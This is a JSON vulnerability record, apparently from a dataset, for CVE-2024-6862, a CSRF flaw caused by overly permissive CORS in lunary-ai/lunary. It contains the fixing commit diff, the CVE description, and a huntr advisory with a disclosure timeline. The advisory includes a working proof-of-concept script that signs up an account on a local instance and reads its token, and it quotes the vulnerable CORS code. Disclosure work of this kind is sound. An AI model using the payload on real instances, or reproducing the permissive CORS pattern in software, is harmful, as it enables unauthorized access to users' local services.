{
    "CVE-2024-6862": {
        "published_date": "2024-09-13T16:13:51.639Z",
        "patch_commits": [
            {
                "url": "https://github.com/lunary-ai/lunary/commit/3451fcd7b9d95e9091d62c515752f39f2faa6e54",
                "content": "fix: cors too permisive (#515)\n\nFilename: packages/backend/src/utils/cors.ts:\n```\n@@ -3,8 +3,13 @@\nimport { Context, Next } from \"koa\"\n import { createMiddleware } from \"./middleware\"\n \n async function patchedCors(ctx: Context, next: Next) {\n+  const origin =\n+    process.env.NODE_ENV !== \"production\"\n+      ? ctx.get(\"Origin\") || \"*\"\n+      : process.env.APP_URL!\n+\n   if (ctx.method === \"options\") {\n-    ctx.set(\"Access-Control-Allow-Origin\", ctx.get(\"Origin\") || \"*\")\n+    ctx.set(\"Access-Control-Allow-Origin\", origin)\n     ctx.set(\"Access-Control-Allow-Methods\", \"GET, POST, PATCH, OPTIONS, DELETE\")\n     ctx.set(\"Access-Control-Allow-Credentials\", \"true\")\n     ctx.set(\n\n@@ -14,10 +19,9 @@\nasync function patchedCors(ctx: Context, next: Next) {\n     ctx.status = 204\n     return\n   }\n+\n   await cors({\n-    origin(ctx) {\n-      return ctx.get(\"Origin\") || \"*\"\n-    },\n+    origin,\n     credentials: true,\n     allowMethods: [\"GET\", \"POST\", \"PATCH\", \"DELETE\", \"OPTIONS\"],\n     allowHeaders: [\"Content-Type\", \"Authorization\", \"Accept\"],\n```"
            }
        ],
        "sw_version": "v1.4.8",
        "sw_version_wget": "https://github.com/lunary-ai/lunary/archive/refs/tags/v1.4.8.zip",
        "description": "A Cross-Site Request Forgery (CSRF) vulnerability exists in lunary-ai/lunary version 1.2.34 due to overly permissive CORS settings. This vulnerability allows an attacker to sign up for and create projects or use the instance as if they were a user with local access. The main attack vector is for instances hosted locally on personal machines, which are not publicly accessible. The CORS settings in the backend permit all origins, exposing unauthenticated endpoints to CSRF attacks.",
        "sec_adv": [
            {
                "url": "https://huntr.com/bounties/0b1d851e-3455-480c-ad5a-23565894976f",
                "content": "Bounties\nPartners\nCommunity\nInfo\nSUBMIT REPORT\nCSRF on endpoint for user signup in lunary-ai/lunary\nValid\nReported on Jun 13th 2024\nSummary\nOverly permissive CORS settings expose all unauthed endpoints to CSRF. In general, this allows an attacker to sign up for and create projects/use the instance as if they were an user with local access. The main attack vector would be for instances that are hosted on locally on someone's personal machine, which aren't publicly accessible (since if they were, attackers could just register by visiting the app themselves).\nPOC\nRun an instance of lunary, with the backend running at e.g. localhost:3333.\nHost the following payload on a standard http-server:\n<script>\n    const req = new XMLHttpRequest();\n        req.onreadystatechange = function () {\n        if (req.readyState == XMLHttpRequest.DONE) {\n            // Here, with a valid token one can use the token to perform other requests\n            // (Create projects, log stuff, etc.)\n            console.log(JSON.parse(req.response).token);\n        }\n    }\n    \n    req.open(\"POST\", \"http://localhost:3333/auth/signup\");\n    req.setRequestHeader(\"Content-Type\", \"application/json;charset=UTF-8\");\n    req.send(JSON.stringify({\n        \"email\": \"somemail@a.com\",\n        \"password\": \"somepassword\",\n        \"name\": \"somename\",\n        \"projectName\": \"Project #1\",\n        \"orgName\": \"someone's Org\",\n        \"employeeCount\": \"6-49\",\n        \"whereFindUs\": \"hackernews\",\n        \"signupMethod\": \"signup\"\n    }));\n</script>\nDescription\nThe CORS settings for the backend is found here, and looks like this:\nif (ctx.method === \"options\") {\n    ctx.set(\"Access-Control-Allow-Origin\", ctx.get(\"Origin\") || \"*\")\n    ctx.set(\"Access-Control-Allow-Methods\", \"GET, POST, PATCH, OPTIONS, DELETE\")\n    ctx.set(\"Access-Control-Allow-Credentials\", \"true\")\n    ctx.set(\n    \"Access-Control-Allow-Headers\",\n    \"Origin, X-Requested-With, Content-Type, Accept, fdi-version, rid, st-auth-mode, Authorization\",\n    )\n    ctx.status = 204\n    return\n}\nawait cors({\n    origin(ctx) {\n        console.log(ctx);\n        return ctx.get(\"Origin\") || \"*\"\n    },\n    credentials: true,\n    allowMethods: [\"GET\", \"POST\", \"PATCH\", \"DELETE\", \"OPTIONS\"],\n    allowHeaders: [\"Content-Type\", \"Authorization\", \"Accept\"],\n})(ctx, next)\nIn practice, this actually opens up all endpoints to CSRF. However, since most of them need a valid auth token (and those are not accessible to the attacker without access to the localStorage where the auth tokens are kept), it is only intially possible to get at endpoints that do not require any authentication.\nImpact\nThis vulnerability makes it possible for attackers to use a hosted instance of lunary through CSRF, even though the instance itself is not exposed to the network. This can also be misused to pollute the app with an arbitrary number of organisations/users.\nWe are processing your report and will contact thelunary-ai/lunary team within 24 hours.a year ago\nWe have contacted a member of thelunary-ai/lunary team and are waiting to hear backa year ago\nWe have sent a follow up to the lunary-ai/lunary team. We will try again in 4 days.a year ago\nWe have sent a second follow up to the lunary-ai/lunary team. We will try again in 7 days.a year ago\nWe have sent a third follow up to the lunary-ai/lunary team. We will try again in 14 days.a year ago\nWe have sent a fourth follow up to the lunary-ai/lunary team. We will send a final notification 48 hours before report publication.10 months ago\nMarcellomodified the Severity from Medium (4.3) to High (7.4)10 months ago\nThe researcher has received a minor penalty to their credibility for miscalculating the severity: -1\nMarcello validated this vulnerability10 months ago\npatrik-hahas been awarded the disclosure bounty\nThe fix bounty is now up for grabs\nThe researcher's credibility has increased: +7\nCVE-2024-6862assigned to this report.10 months ago\nHugues Chocartmarked this as fixedin 1.4.10with commit3451fc9 months ago\nHugues Chocarthas been awarded the fix bounty\nHugues Chocart gave praise9 months ago\nThanks\nThe researcher's credibility has slightly increased as a result of the maintainer's thanks: +1\nWe have notified the lunary-ai/lunary maintainers about this report in their weekly follow-up8 months ago\nWe have sent a warning to the lunary-ai/lunary team to inform them that this report will be published in 48 hours8 months ago\nThis vulnerability has now been published8 months ago\nCVE-2024-6862has now been published8 months ago\nSign in to join this conversation\nCVE\nCVE-2024-6862\n(Published)\nVulnerability Type\nCWE-352: Cross-Site Request Forgery (CSRF)\nSeverity\nHigh (7.4)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nRequired\nScope\nChanged\nConfidentiality\nHigh\nIntegrity\nNone\nAvailability\nNone\nOpen in visual CVSS calculator\nRegistry\nNpm\nAffected Version\n1.2.34\nVisibility\nPublic\nStatus\nFixed\nDisclosure Bounty\n$450\nFix Bounty\n$112.5\nFound by\nFixed by\nSupported by Protect AI and leading the way to MLSecOps and greater AI security.\nÂ© 2024\nPrivacy Policy\nTerms of Service\nCode of Conduct\nCookie Preferences\nContact Us",
                "effective": true,
                "effective_reason": "The advisory includes a proof of concept detailing an exploit of the described vulnerability."
            }
        ],
        "cwe": [
            {
                "id": "CWE-352",
                "value": "CWE-352 Cross-Site Request Forgery (CSRF)"
            }
        ]
    }
}